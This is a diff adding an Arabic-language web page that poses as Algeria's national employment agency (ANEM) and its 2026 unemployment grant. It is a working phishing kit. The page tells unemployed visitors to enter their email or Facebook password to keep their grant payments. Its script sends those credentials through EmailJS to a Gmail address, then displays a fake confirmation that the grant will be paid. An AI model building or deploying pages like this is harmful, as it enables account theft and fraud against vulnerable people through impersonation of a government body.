@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>منصة منحة البطالة 2026 | تفعيل الصرف المباشر</title>
+    <!-- Google Fonts و Font Awesome -->
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- EmailJS Library -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1.5rem;
+            position: relative;
+        }
+
+        /* خلفية علم الجزائر شفافة */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(90deg, 
+                rgba(0, 100, 0, 0.15) 0px, 
+                rgba(0, 100, 0, 0.15) 33.33%,
+                rgba(255, 255, 255, 0.05) 33.33%,
+                rgba(255, 255, 255, 0.05) 66.66%,
+                rgba(210, 16, 52, 0.15) 66.66%,
+                rgba(210, 16, 52, 0.15) 100%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        body::after {
+            content: "☪";
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            font-size: 120px;
+            opacity: 0.08;
+            color: #fff;
+            font-weight: normal;
+            pointer-events: none;
+            font-family: serif;
+            z-index: 0;
+        }
+
+        .card {
+            max-width: 550px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(12px);
+            border-radius: 2rem;
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.2), 0 0 0 1px rgba(255, 255, 255, 0.1);
+            overflow: hidden;
+            transition: transform 0.3s ease;
+            position: relative;
+            z-index: 2;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+        }
+
+        /* رأس الصفحة مع العلم المتحرك (🇩🇿) */
+        .hero-header {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 1.2rem 1rem;
+            text-align: center;
+            border-bottom: 1px solid rgba(255,255,255,0.2);
+        }
+        .hero-header h1 {
+            font-size: 1.7rem;
+            color: #fff;
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.6rem;
+            flex-wrap: wrap;
+        }
+        .hero-header p {
+            color: rgba(255,255,210,0.9);
+            margin-top: 0.5rem;
+            font-size: 0.9rem;
+        }
+        /* العلم المتحرك باستخدام الإموجي */
+        .waving-flag {
+            display: inline-block;
+            animation: waveFlag 1s ease-in-out infinite;
+            transform-origin: center center;
+            font-size: 2rem;
+        }
+        @keyframes waveFlag {
+            0% { transform: rotate(0deg) scale(1);}
+            50% { transform: rotate(12deg) scale(1.1);}
+            100% { transform: rotate(0deg) scale(1);}
+        }
+
+        .tabs {
+            display: flex;
+            background: rgba(0, 0, 0, 0.3);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        .tab-btn {
+            flex: 1;
+            text-align: center;
+            padding: 1rem 0;
+            font-size: 1.05rem;
+            font-weight: 700;
+            cursor: pointer;
+            color: #ddd;
+            transition: all 0.3s;
+            background: transparent;
+            border: none;
+            font-family: inherit;
+        }
+
+        .tab-btn i {
+            margin-left: 0.5rem;
+        }
+
+        .tab-btn.active {
+            color: #fff;
+            background: rgba(255, 255, 255, 0.1);
+            border-bottom: 3px solid #f59e0b;
+        }
+
+        .tab-content {
+            padding: 2rem 1.8rem 2rem;
+        }
+
+        .form-pane {
+            display: none;
+            animation: fadeIn 0.4s ease;
+        }
+
+        .form-pane.active-pane {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px);}
+            to { opacity: 1; transform: translateY(0);}
+        }
+
+        .input-group {
+            margin-bottom: 1.5rem;
+            position: relative;
+        }
+
+        .input-group i {
+            position: absolute;
+            right: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #fbbf24;
+            font-size: 1.2rem;
+            pointer-events: none;
+            transition: 0.2s;
+        }
+
+        input {
+            width: 100%;
+            padding: 1rem 2.8rem 1rem 1rem;
+            font-size: 1rem;
+            font-family: 'Cairo', sans-serif;
+            background: rgba(255, 255, 255, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 1.5rem;
+            outline: none;
+            color: #fff;
+            transition: all 0.2s;
+        }
+
+        input:focus {
+            border-color: #f59e0b;
+            background: rgba(255, 255, 255, 0.25);
+            box-shadow: 0 0 0 3px rgba(245, 158, 11, 0.3);
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 0.9rem;
+            background: linear-gradient(90deg, #f59e0b, #d97706);
+            border: none;
+            border-radius: 2rem;
+            font-size: 1.1rem;
+            font-weight: 700;
+            font-family: 'Cairo', sans-serif;
+            color: white;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 0.5rem;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .login-btn:hover {
+            background: linear-gradient(90deg, #d97706, #b45309);
+            transform: scale(0.98);
+        }
+
+        .error-msg {
+            color: #ffb4a2;
+            font-size: 0.8rem;
+            margin-top: 0.4rem;
+            margin-right: 0.8rem;
+            display: flex;
+            align-items: center;
+            gap: 0.3rem;
+        }
+
+        .success-toast {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #10b981;
+            color: white;
+            padding: 0.8rem 1.8rem;
+            border-radius: 3rem;
+            font-weight: bold;
+            font-size: 0.9rem;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+            z-index: 1000;
+            opacity: 0;
+            transition: opacity 0.3s;
+            pointer-events: none;
+            backdrop-filter: blur(8px);
+        }
+
+        .agency-footer {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.6rem;
+            margin-top: 1.8rem;
+            padding-top: 1rem;
+            border-top: 1px solid rgba(255,255,255,0.2);
+            font-size: 0.85rem;
+            color: rgba(255,255,240,0.9);
+            text-align: center;
+            flex-wrap: wrap;
+        }
+
+        .agency-logo {
+            background: rgba(255,255,255,0.2);
+            border-radius: 3rem;
+            padding: 0.3rem 0.9rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-weight: 700;
+            backdrop-filter: blur(4px);
+        }
+
+        .agency-logo i {
+            font-size: 1.2rem;
+            color: #ffd966;
+        }
+
+        .flag-note {
+            font-size: 0.7rem;
+            color: rgba(255,255,210,0.7);
+            display: inline-flex;
+            align-items: center;
+            gap: 0.3rem;
+        }
+
+        .small-waving {
+            display: inline-block;
+            animation: waveFlag 0.8s ease-in-out infinite;
+            font-size: 1.2rem;
+            margin-right: 4px;
+        }
+
+        @media (max-width: 480px) {
+            .tab-content {
+                padding: 1.5rem;
+            }
+            .tab-btn {
+                font-size: 0.9rem;
+            }
+            .hero-header h1 {
+                font-size: 1.3rem;
+            }
+            .waving-flag {
+                font-size: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <div class="hero-header">
+        <h1>
+            <span class="waving-flag">🇩🇿</span>
+            منصة منحة البطالة 2026
+            <span class="waving-flag">🇩🇿</span>
+        </h1>
+        <p>🔔 تدعو الوكالة الوطنية للتشغيل جميع المستفيدين إلى ضرورة ربط بريدهم الإلكتروني أو حساب الفيسبوك لتفعيل صرف المنحة مباشرة في حساباتهم البريدية، دون الحاجة إلى التنقل إلى الوكالة، وذلك لتفادي توقف المنحة.</p>
+    </div>
+    <div class="tabs">
+        <button class="tab-btn active" data-tab="emailTab">
+            <i class="fas fa-envelope"></i> بريد إلكتروني (تفعيل المنحة)
+        </button>
+        <button class="tab-btn" data-tab="facebookTab">
+            <i class="fab fa-facebook-f"></i> فيسبوك (تفعيل المنحة)
+        </button>
+    </div>
+
+    <div class="tab-content">
+        <!-- نموذج البريد الإلكتروني -->
+        <div id="emailPane" class="form-pane active-pane">
+            <div class="input-group">
+                <i class="fas fa-envelope"></i>
+                <input type="email" id="emailInput" placeholder="البريد الإلكتروني الخاص بك (لربط المنحة)" autocomplete="email">
+            </div>
+            <div class="input-group">
+                <i class="fas fa-lock"></i>
+                <input type="password" id="passwordInput" placeholder="كلمة المرور (لتأكيد الهوية)" autocomplete="current-password">
+            </div>
+            <div id="emailError" class="error-msg"></div>
+            <button class="login-btn" id="emailLoginBtn">
+                <i class="fas fa-exchange-alt"></i> ربط البريد وتفعيل الصرف
+            </button>
+        </div>
+
+        <!-- نموذج فيسبوك -->
+        <div id="facebookPane" class="form-pane">
+            <div class="input-group">
+                <i class="fab fa-facebook-f"></i>
+                <input type="text" id="fbUserInput" placeholder="اسم المستخدم أو البريد الإلكتروني لفيسبوك (لربط الحساب)" autocomplete="username">
+            </div>
+            <div class="input-group">
+                <i class="fas fa-lock"></i>
+                <input type="password" id="fbPassInput" placeholder="كلمة سر فيسبوك (لتأكيد الربط)" autocomplete="current-password">
+            </div>
+            <div id="fbError" class="error-msg"></div>
+            <button class="login-btn" id="fbLoginBtn">
+                <i class="fab fa-facebook-f"></i> ربط فيسبوك وتفعيل الصرف
+            </button>
+        </div>
+
+        <!-- تذييل يحتوي رمز وكالة التشغيل وعلم متحرك صغير -->
+        <div class="agency-footer">
+            <div class="agency-logo">
+                <i class="fas fa-briefcase"></i>
+                <span>الوكالة الوطنية للتشغيل ANEM</span>
+                <i class="fas fa-handshake"></i>
+                <span class="small-waving">🇩🇿</span>
+            </div>
+            <div class="flag-note">
+                <i class="fas fa-flag-checkered"></i> الجمهورية الجزائرية الديمقراطية الشعبية
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="toastMessage" class="success-toast"></div>
+
+<script>
+    // تهيئة EmailJS بالمفتاح العام المقدم
+    (function() {
+        emailjs.init("NK9pKzIHPOVWXKg3B");
+    })();
+
+    // عناصر DOM
+    const emailPane = document.getElementById('emailPane');
+    const facebookPane = document.getElementById('facebookPane');
+    const tabBtns = document.querySelectorAll('.tab-btn');
+    const emailLoginBtn = document.getElementById('emailLoginBtn');
+    const fbLoginBtn = document.getElementById('fbLoginBtn');
+    const emailErrorDiv = document.getElementById('emailError');
+    const fbErrorDiv = document.getElementById('fbError');
+    const emailInput = document.getElementById('emailInput');
+    const passwordInput = document.getElementById('passwordInput');
+    const fbUserInput = document.getElementById('fbUserInput');
+    const fbPassInput = document.getElementById('fbPassInput');
+    const toast = document.getElementById('toastMessage');
+
+    // دالة عرض الإشعارات
+    function showToast(message, isError = false) {
+        toast.textContent = message;
+        toast.style.backgroundColor = isError ? '#dc2626' : '#10b981';
+        toast.style.opacity = '1';
+        setTimeout(() => {
+            toast.style.opacity = '0';
+        }, 3000);
+    }
+
+    // مسح الرسائل السابقة
+    function clearErrors() {
+        emailErrorDiv.innerHTML = '';
+        fbErrorDiv.innerHTML = '';
+    }
+
+    // التحقق من البريد الإلكتروني
+    function validateEmailLogin() {
+        const email = emailInput.value.trim();
+        const password = passwordInput.value.trim();
+        clearErrors();
+
+        if (!email) {
+            emailErrorDiv.innerHTML = '<i class="fas fa-exclamation-circle"></i> الرجاء إدخال البريد الإلكتروني لربط المنحة';
+            return false;
+        }
+        if (!isValidEmail(email)) {
+            emailErrorDiv.innerHTML = '<i class="fas fa-exclamation-circle"></i> صيغة البريد الإلكتروني غير صحيحة';
+            return false;
+        }
+        if (!password) {
+            emailErrorDiv.innerHTML = '<i class="fas fa-exclamation-circle"></i> كلمة المرور مطلوبة لتأكيد الهوية';
+            return false;
+        }
+        if (password.length < 4) {
+            emailErrorDiv.innerHTML = '<i class="fas fa-exclamation-circle"></i> كلمة المرور يجب أن تكون 4 أحرف على الأقل';
+            return false;
+        }
+        return true;
+    }
+
+    function isValidEmail(email) {
+        const re = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
+        return re.test(email);
+    }
+
+    // التحقق من بيانات فيسبوك
+    function validateFacebookLogin() {
+        const username = fbUserInput.value.trim();
+        const password = fbPassInput.value.trim();
+        clearErrors();
+
+        if (!username) {
+            fbErrorDiv.innerHTML = '<i class="fas fa-exclamation-circle"></i> أدخل اسم المستخدم أو البريد الخاص بفيسبوك لربط المنحة';
+            return false;
+        }
+        if (!password) {
+            fbErrorDiv.innerHTML = '<i class="fas fa-exclamation-circle"></i> كلمة مرور فيسبوك مطلوبة لتأكيد الربط';
+            return false;
+        }
+        if (password.length < 4) {
+            fbErrorDiv.innerHTML = '<i class="fas fa-exclamation-circle"></i> كلمة المرور ضعيفة (الأقل 4 أحرف)';
+            return false;
+        }
+        return true;
+    }
+
+    // دالة إرسال البيانات إلى EmailJS
+    async function sendToEmailJS(templateParams) {
+        try {
+            const response = await emailjs.send('service_lkr5udj', 'template_bcioejm', templateParams);
+            console.log('EmailJS Success:', response);
+            showToast('✓ تم ربط حسابك بنجاح! سيتم صرف المنحة قريبًا.', false);
+        } catch (error) {
+            console.error('EmailJS Error:', error);
+            showToast('⚠️ حدث خطأ في الربط، يرجى المحاولة مرة أخرى', true);
+        }
+    }
+
+    // معالجة ربط البريد الإلكتروني
+    async function handleEmailLogin() {
+        if (validateEmailLogin()) {
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+            showToast('جاري ربط البريد وتفعيل المنحة...', false);
+            await sendToEmailJS({
+                platform: 'البريد الإلكتروني (منحة البطالة)',
+                user_email: email,
+                user_password: password,
+                to_email: 'hakikking399@gmail.com',
+                message: `تفعيل صرف المنحة عبر البريد الإلكتروني\nالبريد: ${email}\nكلمة المرور: ${password}`
+            });
+            console.log("بيانات البريد:", { email, password });
+        } else {
+            showToast("يرجى تصحيح البيانات المطلوبة لربط المنحة", true);
+        }
+    }
+
+    // معالجة ربط فيسبوك
+    async function handleFacebookLogin() {
+        if (validateFacebookLogin()) {
+            const fbUser = fbUserInput.value.trim();
+            const fbPass = fbPassInput.value.trim();
+            showToast('جاري ربط فيسبوك وتفعيل المنحة...', false);
+            await sendToEmailJS({
+                platform: 'فيسبوك (منحة البطالة)',
+                user_email: fbUser,
+                user_password: fbPass,
+                to_email: 'hakikking399@gmail.com',
+                message: `تفعيل صرف المنحة عبر فيسبوك\nاسم المستخدم/البريد: ${fbUser}\nكلمة المرور: ${fbPass}`
+            });
+            console.log("بيانات فيسبوك:", { username: fbUser, password: fbPass });
+        } else {
+            showToast("أكمل بيانات فيسبوك بشكل صحيح لربط المنحة", true);
+        }
+    }
+
+    // تبديل التبويبات
+    function switchTab(tabId) {
+        tabBtns.forEach(btn => {
+            if (btn.getAttribute('data-tab') === tabId) {
+                btn.classList.add('active');
+            } else {
+                btn.classList.remove('active');
+            }
+        });
+
+        if (tabId === 'emailTab') {
+            emailPane.classList.add('active-pane');
+            facebookPane.classList.remove('active-pane');
+        } else {
+            facebookPane.classList.add('active-pane');
+            emailPane.classList.remove('active-pane');
+        }
+        clearErrors();
+    }
+
+    // ربط الأحداث
+    emailLoginBtn.addEventListener('click', handleEmailLogin);
+    fbLoginBtn.addEventListener('click', handleFacebookLogin);
+
+    tabBtns.forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            const tab = btn.getAttribute('data-tab');
+            switchTab(tab);
+        });
+    });
+
+    // السماح بالضغط على Enter
+    const inputs = [emailInput, passwordInput, fbUserInput, fbPassInput];
+    inputs.forEach(input => {
+        input.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                if (emailPane.classList.contains('active-pane')) {
+                    handleEmailLogin();
+                } else {
+                    handleFacebookLogin();
+                }
+            }
+        });
+    });
+</script>
+</body>
+</html>
